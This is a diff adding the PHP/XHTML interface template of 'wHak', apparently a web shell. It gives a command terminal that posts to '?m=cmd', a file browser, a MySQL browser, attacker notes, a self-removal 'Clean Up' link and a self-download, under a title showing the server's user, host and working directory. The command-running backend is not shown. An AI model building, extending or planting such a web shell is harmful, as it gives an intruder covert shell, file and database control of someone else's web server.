@@ -1,0 +1,85 @@
+print '<?xml version="1.0" encoding="UTF-8"?>';
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+    <title>wHak <?php print $this->Session['whoami'].'@'. $_SERVER['HTTP_HOST'] .':'.$this->Session['cwd'] .'$'; ?></title>
+    <script type="text/javascript" src="?m=content&o=mootools.js"></script>
+    <script type="text/javascript" src="?m=content&o=functions.js"></script>
+    <link rel="stylesheet" media="screen" href="?m=content&o=main.css" />
+    <link rel="stylesheet" media="screen" href="?m=content&o=icon.silk.spritesheet.css" />
+</head>
+<body class="hbox">
+    <div id="header">
+        <div class="header-info">
+            <span id="server-time"></span><br />
+            <span id="server-php_version"></span>
+        </div>
+        <h1>wHak <?php print WH_VERSION; ?></h1>
+        <ul class="nav">
+            <li><a class="icon terminal" href="javascript:show('console-section')" title="Terminal">Terminal</a></li>
+            <li><a class="icon note" href="javascript:show('note-section')" title="Notes">Notes</a></li>
+            <li><a class="icon file_folder" href="javascript:show('file-section')" title="File Browser">File Browser</a></li>
+            <li><a class="icon database" href="javascript:show('db-section')" title="DB Browser">DB Browser</a></li>
+            <li><a class="icon cleanup" href="?m=clean_up" title="Remove Whak">Clean Up</a></li>
+            <li><a class="icon file_zip_<?=(WH_STATUS==='COMPILED') ? 'go' : 'add'?>" href="?m=<?=(WH_STATUS==='COMPILED') ? 'extract' : 'compile'?>" title="Compile/Extraxt whak"><?=(WH_STATUS==='COMPILED') ? 'Extract' : 'Compile'?></a></li>
+            <li><a class="icon arrow_down" href="?m=dl" title="Download whak">Download</a></li>
+            <li><a class="icon logout" href="?m=logout" title="Logout">Log Out</a></li>
+        </ul>
+    </div>
+    <div id="content">
+        <div class="section" id="console-section">
+            <form id="cmd-form" action="?m=cmd" method="post">
+                <div id="console-content"></div>
+                <div id="console-cmd">
+                    <span id="server-prompt"></span>
+                    <input type="text" name="cmd" id="cmd" autocomplete="off" />
+                </div>
+            </form>
+        </div>
+        <div class="section" id="note-section" style="display: none;">
+            <a href="?m=dl_notes" class="icon arrow_down" title="download notes"></a>
+            <div id="server-notes">
+                <?php print $this->get_note_html(); ?>
+            </div>
+
+            <form id="note-form" action="?m=add_note" method="post">
+                <textarea name="notes" id="notes"></textarea>
+                <input type="submit" value="Save" />
+            </form>
+        </div>
+        <div class="section" id="file-section" style="display: none;">
+            <?php
+                $this->action_ls();
+            ?>
+        </div>
+        <div class="section" id="db-section" style="display: none;">
+         <div id="wrapper">
+            <table>
+                <tr>
+                    <td style="width:200px;">
+                        <div id="left">
+                        <?php 
+                            $this->action_mysql($_GET);
+                        ?>
+                        </div>
+                    </td>
+                    <td valign='top' align='left'>
+                        <div id="right">&nbsp;
+                        </div>
+                    </td>
+                </tr>
+            </table>
+         </div>       
+
+            
+        </div>
+    </div>
+
+    <div id="footer">
+        <div id="server-name"></div>
+        <span id="server-uptime"></span>
+    </div>
+    <iframe id="iframe-hack" name="iframe-hack"></iframe>
+</body>
+</html>
